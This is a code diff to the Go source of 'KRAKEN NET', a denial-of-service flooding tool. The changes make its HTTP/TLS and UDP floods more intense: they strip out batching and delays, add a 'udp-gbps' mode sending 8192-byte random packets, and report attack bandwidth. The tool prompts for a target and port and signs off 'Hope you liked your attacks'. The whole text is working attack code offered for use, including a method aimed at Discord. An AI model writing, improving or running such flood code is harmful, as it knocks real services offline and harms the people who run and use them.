@@ -57,11 +57,9 @@ func printBanner() {
                  %#=----+%.                 
                  +%%%#%%%#                  
                   .*%%%#-                   
-                                            
-                                            
- 
+
 	KRAKEN NET - v2.1
-	Made by Piwiii2.0
+    Made by Piwiii2.0
 `
 	fmt.Print(Cyan)
 	fmt.Println(banner)
@@ -117,7 +115,7 @@ func newHTTPClientTLS(connections int) *http.Client {
 	tr := &http.Transport{
 		MaxIdleConns:        connections * 2,
 		MaxIdleConnsPerHost: connections * 2,
-		IdleConnTimeout:     5 * time.Second,
+		IdleConnTimeout:     10 * time.Second,
 		DisableCompression:  true,
 		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
 	}
@@ -146,25 +144,28 @@ func sendTLSRequest(client *http.Client, baseURL string) bool {
 	return resp.StatusCode >= 200 && resp.StatusCode < 500
 }
 
-func sendUDP(conn net.Conn, payload []byte) bool {
-	_, err := conn.Write(payload)
-	return err == nil
-}
-
-func generateDiscordPayload() []byte {
-	payload := make([]byte, 1024)
-	for i := range payload {
-		payload[i] = byte(rand.Intn(256))
-	}
-	return payload
-}
-
-func generateRandomUDP(size int) []byte {
+func generatePayload(size int) []byte {
 	payload := make([]byte, size)
 	for i := range payload {
 		payload[i] = byte(rand.Intn(256))
 	}
 	return payload
+}
+
+func sendUDP(conn net.Conn, payload []byte) bool {
+	_, err := conn.Write(payload)
+	return err == nil
+}
+
+// formatBytes convertit le débit en lecture humaine intelligente
+func formatBytes(bytes float64) string {
+	units := []string{"Bps", "KBps", "MBps", "GBps"}
+	i := 0
+	for bytes >= 1024 && i < len(units)-1 {
+		bytes /= 1024
+		i++
+	}
+	return fmt.Sprintf("%.2f %s", bytes, units[i])
 }
 
 func runAttack() {
@@ -177,12 +178,12 @@ func runAttack() {
 	target, _ := reader.ReadString('\n')
 	target = strings.TrimSpace(target)
 
-	fmt.Print(Yellow + "🛠 Select method :\nkraken\ntls\nudp-discord\nudp-bypass\n" + Reset)
+	fmt.Print(Yellow + "🛠 Select method :\nkraken\ntls\nudp-discord\nudp-bypass\nudp-gbps\n" + Reset)
 	mode, _ := reader.ReadString('\n')
 	mode = strings.TrimSpace(strings.ToLower(mode))
 
 	var connections int
-	if mode == "kraken" || mode == "tls" || mode == "udp-discord" || mode == "udp-bypass" {
+	if mode != "" {
 		fmt.Print(Yellow + "🔗 Connections per worker: " + Reset)
 		cStr, _ := reader.ReadString('\n')
 		connections, _ = strconv.Atoi(strings.TrimSpace(cStr))
@@ -207,7 +208,7 @@ func runAttack() {
 	attackDuration := time.Duration(durationSec) * time.Second
 
 	var udpPort int
-	if mode == "udp-discord" || mode == "udp-bypass" {
+	if mode == "udp-discord" || mode == "udp-bypass" || mode == "udp-gbps" {
 		fmt.Print(Yellow + "🎯 UDP Port (target): " + Reset)
 		portStr, _ := reader.ReadString('\n')
 		udpPort, _ = strconv.Atoi(strings.TrimSpace(portStr))
@@ -220,11 +221,10 @@ func runAttack() {
 
 	var totalSuccess int64
 	var totalFail int64
+	var totalBytes int64
 	var wg sync.WaitGroup
 	ctx, cancel := context.WithTimeout(context.Background(), attackDuration)
 	defer cancel()
-
-	batchSize := 20
 
 	for i := 0; i < workers; i++ {
 		wg.Add(1)
@@ -233,23 +233,22 @@ func runAttack() {
 			switch mode {
 			case "tls", "kraken":
 				client := newHTTPClientTLS(connections)
-				for j := 0; j < connections; j += batchSize {
+				for {
 					select {
 					case <-ctx.Done():
 						return
 					default:
-						for k := 0; k < batchSize && j+k < connections; k++ {
+						for j := 0; j < connections; j++ {
 							if sendTLSRequest(client, target) {
 								atomic.AddInt64(&totalSuccess, 1)
 							} else {
 								atomic.AddInt64(&totalFail, 1)
 							}
 						}
-						time.Sleep(1 * time.Millisecond)
 					}
 				}
 
-			case "udp-discord", "udp-bypass":
+			case "udp-discord", "udp-bypass", "udp-gbps":
 				conns := make([]net.Conn, connections)
 				for i := 0; i < connections; i++ {
 					c, err := net.Dial("udp", fmt.Sprintf("%s:%d", target, udpPort))
@@ -266,29 +265,27 @@ func runAttack() {
 					}
 				}()
 
-				for j := 0; j < len(conns); j += batchSize {
+				payloadSize := 1024
+				if mode == "udp-gbps" {
+					payloadSize = 8192
+				}
+
+				for {
 					select {
 					case <-ctx.Done():
 						return
 					default:
-						for k := 0; k < batchSize && j+k < len(conns); k++ {
-							c := conns[j+k]
+						for _, c := range conns {
 							if c != nil {
-								var payload []byte
-								if mode == "udp-discord" {
-									payload = generateDiscordPayload()
-								} else {
-									size := 128 + rand.Intn(256)
-									payload = generateRandomUDP(size)
-								}
+								payload := generatePayload(payloadSize)
 								if sendUDP(c, payload) {
 									atomic.AddInt64(&totalSuccess, 1)
+									atomic.AddInt64(&totalBytes, int64(len(payload)))
 								} else {
 									atomic.AddInt64(&totalFail, 1)
 								}
 							}
 						}
-						time.Sleep(1 * time.Millisecond)
 					}
 				}
 			}
@@ -297,14 +294,23 @@ func runAttack() {
 
 	wg.Wait()
 
-	total := atomic.LoadInt64(&totalSuccess) + atomic.LoadInt64(&totalFail)
-	rps := float64(total) / float64(durationSec)
-
-	fmt.Println(Magenta + "🧨 Attack complete. Results:" + Reset)
-	fmt.Printf("%s✅ Success requests : %d%s\n", Green, totalSuccess, Reset)
-	fmt.Printf("%s❌ Failed requests  : %d%s\n", Red, totalFail, Reset)
-	fmt.Printf("%s⏱️ Duration         : %d seconds%s\n", Cyan, durationSec, Reset)
-	fmt.Printf("%s📈 Average RPS      : %.2f req/sec%s\n", Yellow, rps, Reset)
+	if mode == "tls" || mode == "kraken" {
+		total := atomic.LoadInt64(&totalSuccess) + atomic.LoadInt64(&totalFail)
+		rps := float64(total) / float64(durationSec)
+		fmt.Println(Magenta + "🧨 Attack complete. Results:" + Reset)
+		fmt.Printf("%s✅ Success requests : %d%s\n", Green, totalSuccess, Reset)
+		fmt.Printf("%s❌ Failed requests  : %d%s\n", Red, totalFail, Reset)
+		fmt.Printf("%s⏱️ Duration         : %d seconds%s\n", Cyan, durationSec, Reset)
+		fmt.Printf("%s📈 Average RPS      : %.2f req/sec%s\n", Yellow, rps, Reset)
+	} else {
+		bytes := atomic.LoadInt64(&totalBytes)
+		bps := float64(bytes) / float64(durationSec)
+		fmt.Println(Magenta + "🧨 Attack complete. Results:" + Reset)
+		fmt.Printf("%s✅ Success packets : %d%s\n", Green, totalSuccess, Reset)
+		fmt.Printf("%s❌ Failed packets  : %d%s\n", Red, totalFail, Reset)
+		fmt.Printf("%s⏱️ Duration        : %d seconds%s\n", Cyan, durationSec, Reset)
+		fmt.Printf("%s📈 Average BPS     : %s%s\n", Yellow, formatBytes(bps), Reset)
+	}
 }
 
 func main() {
@@ -320,7 +326,7 @@ func main() {
 		again = strings.TrimSpace(strings.ToLower(again))
 
 		if again != "y" {
-			fmt.Println(Green + "👋 Bye! Hope you liked your attacks." + Reset)
+			fmt.Println(Green + "👋 Bye! Hope you liked your attacks" + Reset)
 			break
 		}
 	}
